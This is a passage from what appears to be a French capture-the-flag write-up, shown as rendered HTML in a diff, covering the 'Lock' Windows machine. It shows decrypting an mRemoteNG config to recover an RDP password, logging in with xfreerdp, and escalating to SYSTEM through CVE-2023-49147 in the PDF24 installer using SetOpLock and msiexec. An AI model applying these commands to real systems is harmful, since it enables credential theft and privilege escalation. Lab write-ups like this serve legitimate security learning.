class="s">&#34;AuthVNC&#34;</span> <span class="na">VNCProxyType=</span><span class="s">&#34;ProxyNone&#34;</span> <span class="na">VNCProxyIP=</span><span class="s">&#34;&#34;</span> <span class="na">VNCProxyPort=</span><span class="s">&#34;0&#34;</span> <span class="na">VNCProxyUsername=</span><span class="s">&#34;&#34;</span> <span class="na">VNCProxyPassword=</span><span class="s">&#34;&#34;</span> <span class="na">VNCColors=</span><span class="s">&#34;ColNormal&#34;</span> <span class="na">VNCSmartSizeMode=</span><span class="s">&#34;SmartSAspect&#34;</span> <span class="na">VNCViewOnly=</span><span class="s">&#34;false&#34;</span> <span class="na">RDGatewayUsageMethod=</span><span class="s">&#34;Never&#34;</span> <span class="na">RDGatewayHostname=</span><span class="s">&#34;&#34;</span> <span class="na">RDGatewayUseConnectionCredentials=</span><span class="s">&#34;Yes&#34;</span> <span class="na">RDGatewayUsername=</span><span class="s">&#34;&#34;</span> <span class="na">RDGatewayPassword=</span><span class="s">&#34;&#34;</span> <span class="na">RDGatewayDomain=</span><span class="s">&#34;&#34;</span> <span class="na">InheritCacheBitmaps=</span><span class="s">&#34;false&#34;</span> <span class="na">InheritColors=</span><span class="s">&#34;false&#34;</span> <span class="na">InheritDescription=</span><span class="s">&#34;false&#34;</span> <span class="na">InheritDisplayThemes=</span><span class="s">&#34;false&#34;</span> <span class="na">InheritDisplayWallpaper=</span><span class="s">&#34;false&#34;</span> <span class="na">InheritEnableFontSmoothing=</span><span class="s">&#34;false&#34;</span> <span class="na">InheritEnableDesktopComposition=</span><span class="s">&#34;false&#34;</span> <span class="na">InheritDomain=</span><span class="s">&#34;false&#34;</span> <span class="na">InheritIcon=</span><span class="s">&#34;false&#34;</span> <span class="na">InheritPanel=</span><span class="s">&#34;false&#34;</span> <span class="na">InheritPassword=</span><span class="s">&#34;false&#34;</span> <span class="na">InheritPort=</span><span class="s">&#34;false&#34;</span> <span class="na">InheritProtocol=</span><span class="s">&#34;false&#34;</span> <span class="na">InheritPuttySession=</span><span class="s">&#34;false&#34;</span> <span class="na">InheritRedirectDiskDrives=</span><span class="s">&#34;false&#34;</span> <span class="na">InheritRedirectKeys=</span><span class="s">&#34;false&#34;</span> <span class="na">InheritRedirectPorts=</span><span class="s">&#34;false&#34;</span> <span class="na">InheritRedirectPrinters=</span><span class="s">&#34;false&#34;</span> <span class="na">InheritRedirectSmartCards=</span><span class="s">&#34;false&#34;</span> <span class="na">InheritRedirectSound=</span><span class="s">&#34;false&#34;</span> <span class="na">InheritSoundQuality=</span><span class="s">&#34;false&#34;</span> <span class="na">InheritResolution=</span><span class="s">&#34;false&#34;</span> <span class="na">InheritAutomaticResize=</span><span class="s">&#34;false&#34;</span> <span class="na">InheritUseConsoleSession=</span><span class="s">&#34;false&#34;</span> <span class="na">InheritUseCredSsp=</span><span class="s">&#34;false&#34;</span> <span class="na">InheritRenderingEngine=</span><span class="s">&#34;false&#34;</span> <span class="na">InheritUsername=</span><span class="s">&#34;false&#34;</span> <span class="na">InheritICAEncryptionStrength=</span><span class="s">&#34;false&#34;</span> <span class="na">InheritRDPAuthenticationLevel=</span><span class="s">&#34;false&#34;</span> <span class="na">InheritRDPMinutesToIdleTimeout=</span><span class="s">&#34;false&#34;</span> <span class="na">InheritRDPAlertIdleTimeout=</span><span class="s">&#34;false&#34;</span> <span class="na">InheritLoadBalanceInfo=</span><span class="s">&#34;false&#34;</span> <span class="na">InheritPreExtApp=</span><span class="s">&#34;false&#34;</span> <span class="na">InheritPostExtApp=</span><span class="s">&#34;false&#34;</span> <span class="na">InheritMacAddress=</span><span class="s">&#34;false&#34;</span> <span class="na">InheritUserField=</span><span class="s">&#34;false&#34;</span> <span class="na">InheritExtApp=</span><span class="s">&#34;false&#34;</span> <span class="na">InheritVNCCompression=</span><span class="s">&#34;false&#34;</span> <span class="na">InheritVNCEncoding=</span><span class="s">&#34;false&#34;</span> <span class="na">InheritVNCAuthMode=</span><span class="s">&#34;false&#34;</span> <span class="na">InheritVNCProxyType=</span><span class="s">&#34;false&#34;</span> <span class="na">InheritVNCProxyIP=</span><span class="s">&#34;false&#34;</span> <span class="na">InheritVNCProxyPort=</span><span class="s">&#34;false&#34;</span> <span class="na">InheritVNCProxyUsername=</span><span class="s">&#34;false&#34;</span> <span class="na">InheritVNCProxyPassword=</span><span class="s">&#34;false&#34;</span> <span class="na">InheritVNCColors=</span><span class="s">&#34;false&#34;</span> <span class="na">InheritVNCSmartSizeMode=</span><span class="s">&#34;false&#34;</span> <span class="na">InheritVNCViewOnly=</span><span class="s">&#34;false&#34;</span> <span class="na">InheritRDGatewayUsageMethod=</span><span class="s">&#34;false&#34;</span> <span class="na">InheritRDGatewayHostname=</span><span class="s">&#34;false&#34;</span> <span class="na">InheritRDGatewayUseConnectionCredentials=</span><span class="s">&#34;false&#34;</span> <span class="na">InheritRDGatewayUsername=</span><span class="s">&#34;false&#34;</span> <span class="na">InheritRDGatewayPassword=</span><span class="s">&#34;false&#34;</span> <span class="na">InheritRDGatewayDomain=</span><span class="s">&#34;false&#34;</span> <span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/mrng:Connections&gt;</span></span></span></code></pre></div></div>
+<p>Il est possible de déchiffrer cet fichier avec l&rsquo;outil <a href="https://github.com/gquere/mRemoteNG_password_decrypt" target="_blank" rel="noopener noreffer ">mRemoteNG_password_decrypt</a>. S&rsquo;y trouve alors les identifiants de <code>Gale.Dekarios</code>.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-sh">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">/workspace/Lock
+</span></span><span class="line"><span class="cl">❯ git clone https://github.com/gquere/mRemoteNG_password_decrypt
+</span></span><span class="line"><span class="cl">Cloning into <span class="s1">&#39;mRemoteNG_password_decrypt&#39;</span>...
+</span></span><span class="line"><span class="cl">remote: Enumerating objects: 11, <span class="k">done</span>.
+</span></span><span class="line"><span class="cl">remote: Counting objects: 100% <span class="o">(</span>11/11<span class="o">)</span>, <span class="k">done</span>.
+</span></span><span class="line"><span class="cl">remote: Compressing objects: 100% <span class="o">(</span>9/9<span class="o">)</span>, <span class="k">done</span>.
+</span></span><span class="line"><span class="cl">remote: Total <span class="m">11</span> <span class="o">(</span>delta 2<span class="o">)</span>, reused <span class="m">10</span> <span class="o">(</span>delta 2<span class="o">)</span>, pack-reused <span class="m">0</span> <span class="o">(</span>from 0<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Receiving objects: 100% <span class="o">(</span>11/11<span class="o">)</span>, <span class="k">done</span>.
+</span></span><span class="line"><span class="cl">Resolving deltas: 100% <span class="o">(</span>2/2<span class="o">)</span>, <span class="k">done</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/workspace/Lock
+</span></span><span class="line"><span class="cl">❯ <span class="nb">cd</span> mRemoteNG_password_decrypt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/workspace/Lock
+</span></span><span class="line"><span class="cl">❯ <span class="nb">cd</span> mRemoteNG_password_decrypt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">mRemoteNG_password_decrypt git:master
+</span></span><span class="line"><span class="cl">❯ python3 mremoteng_decrypt.py ../config.xml
+</span></span><span class="line"><span class="cl">Name: RDP/Gale
+</span></span><span class="line"><span class="cl">Hostname: Lock
+</span></span><span class="line"><span class="cl">Username: Gale.Dekarios
+</span></span><span class="line"><span class="cl">Password: ty8wnW9qCKDosXo6</span></span></code></pre></div></div>
+<h2 id="connexion-rdp">Connexion RDP</h2>
+<p>Je me connecte alors en RDP et je récupère le premier flag. Je vois aussi un raccourci d&rsquo;un logiciel <strong>PDF24 Launcher</strong>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sh">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">xfreerdp /v:10.129.234.64 /u:Gale.Dekarios /p:ty8wnW9qCKDosXo6 /cert-ignore</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Lock/Lock-13.png"
+        data-srcset="/images/Lock/Lock-13.png, /images/Lock/Lock-13.png 1.5x, /images/Lock/Lock-13.png 2x"
+        data-sizes="auto"
+        alt="/images/Lock/Lock-13.png"
+        title="/images/Lock/Lock-13.png" width="529" height="592" /></p>
+<h1 id="shell-en-tant-que-nt-authoritysystem">Shell en tant que nt authority\system</h1>
+<h2 id="énumération-2">Énumération</h2>
+<p>En recherchant sur Google <code>pdf24 exploit</code>, je vois un article de <a href="https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-msi-installer-in-pdf24-creator-geek-software-gmbh/" target="_blank" rel="noopener noreffer ">sec-consult</a> que cette version est vulnérable. Je trouve le fichier d&rsquo;installation de <code>pdf24</code> dans le répertoire <code>C:\_install</code>.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Lock/Lock-14.png"
+        data-srcset="/images/Lock/Lock-14.png, /images/Lock/Lock-14.png 1.5x, /images/Lock/Lock-14.png 2x"
+        data-sizes="auto"
+        alt="/images/Lock/Lock-14.png"
+        title="/images/Lock/Lock-14.png" width="921" height="298" /></p>
+<h2 id="cve-2023-49147">CVE-2023-49147</h2>
+<p>Sur ce <a href="https://github.com/googleprojectzero/symboliclink-testing-tools/releases" target="_blank" rel="noopener noreffer ">GitHub</a>, je trouve une version déjà compile de <code>SetOpLock.exe</code> permettant de réaliser cette attaque. Dans un premier terminal, j&rsquo;exécute la commande suivante.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">./SetOpLock.exe &#34;C:\Program Files\PDF24\faxPrnInst.log&#34; r</span></span></code></pre></div></div>
+<p>Puis sur un autre, je démarre le fichier d&rsquo;installation de <code>pdf24</code>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">msiexec.exe /fa C:\_install\pdf24-creator-11.15.1-x64.msi</span></span></code></pre></div></div>
+<p>Cela va créer une fenêtre dont je suis les étapes.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Lock/Lock-15.png"
+        data-srcset="/images/Lock/Lock-15.png, /images/Lock/Lock-15.png 1.5x, /images/Lock/Lock-15.png 2x"
+        data-sizes="auto"
+        alt="/images/Lock/Lock-15.png"
+        title="/images/Lock/Lock-15.png" width="1639" height="689" /></p>
+<p>A ce stade, je clique sur le lien <code>legacy console mode</code> en bas de la fenêtre.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Lock/Lock-16.png"
+        data-srcset="/images/Lock/Lock-16.png, /images/Lock/Lock-16.png 1.5x, /images/Lock/Lock-16.png 2x"
+        data-sizes="auto"
+        alt="/images/Lock/Lock-16.png"
+        title="/images/Lock/Lock-16.png" width="899" height="588" /></p>
+<p>Cela ouvre encore une autre fenêtre nous demandant de choisir un navigateur. Il faut choisir tout navigateur autre que <strong>Microsoft Edge</strong> ou <strong>Internet Explorer</strong>. Moi j&rsquo;ai choisi <strong>Firefox</strong>.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Lock/Lock-17.png"
+        data-srcset="/images/Lock/Lock-17.png, /images/Lock/Lock-17.png 1.5x, /images/Lock/Lock-17.png 2x"
+        data-sizes="auto"
+        alt="/images/Lock/Lock-17.png"
+        title="/images/Lock/Lock-17.png" width="393" height="404" /></p>
+<p>Une fois Firefox ouvert, il faut effectuer la combinaison <strong><code>CTRL+o</code></strong>. Une fenêtre s&rsquo;ouvrira dans laquelle, j&rsquo;écris <code>cmd.exe</code> puis je clique sur <strong>Open</strong>.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Lock/Lock-18.png"
+        data-srcset="/images/Lock/Lock-18.png, /images/Lock/Lock-18.png 1.5x, /images/Lock/Lock-18.png 2x"
+        data-sizes="auto"
+        alt="/images/Lock/Lock-18.png"
+        title="/images/Lock/Lock-18.png" width="1401" height="905" /></p>
+<p>J&rsquo;obtiens alors un shell en tant que <code>nt authority\system</code> et je peux récupérer le second flag.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Lock/Lock-19.png"
+        data-srcset="/images/Lock/Lock-19.png, /images/Lock/Lock-19.png 1.5x, /images/Lock/Lock-19.png 2x"
+        data-sizes="auto"
+        alt="/images/Lock/Lock-19.png"
+        title="/images/Lock/Lock-19.png" width="512" height="504" /></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2025-12-11</span>
+            </div><div id="page-views" class="post-info-mod">
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/lock/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on X" data-sharer="x" data-url="http://localhost:1313/lock/" data-title="Lock" data-via="z3rodol" data-hashtags="Easy,Windows,Active Directory,CVE-2023-49147,Gitea"><i class="fab fa-x-twitter" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags" aria-hidden="true"></i>&nbsp;<a href="/tags/easy/">Easy</a>,&nbsp;<a href="/tags/windows/">Windows</a>,&nbsp;<a href="/tags/active-directory/">Active Directory</a>,&nbsp;<a href="/tags/cve-2023-49147/">CVE-2023-49147</a>,&nbsp;<a href="/tags/gitea/">Gitea</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/manager/" class="prev" rel="prev" title="Manager"><i class="fas fa-angle-left" aria-hidden="true"></i>Manager</a>
+            <a href="/haze/" class="next" rel="next" title="Haze">Haze<i class="fas fa-angle-right" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.158.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 1.0.0"><i class="far fa-kiss-wink-heart" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright" aria-hidden="true"></i><span itemprop="copyrightYear">2025 - 2026</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://z3rodol.github.io" target="_blank">z3rodol</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><script src="/lib/autocomplete/autocomplete.min.js"></script><script src="/lib/lunr/lunr.min.js"></script><script src="/lib/lazysizes/lazysizes.min.js"></script><script src="/lib/lightgallery/lightgallery.min.js"></script><script src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js"></script><script src="/lib/clipboard/clipboard.min.js"></script><script src="/lib/sharer/sharer.min.js"></script><script src="/lib/katex/katex.min.js"></script><script src="/lib/katex/contrib/auto-render.min.js"></script><script src="/lib/katex/contrib/copy-tex.min.js"></script><script src="/lib/katex/contrib/mhchem.min.js"></script><script>window.config={"comment":{},"lightgallery":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":15,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script src="/js/theme.js"></script></body>
+</html>
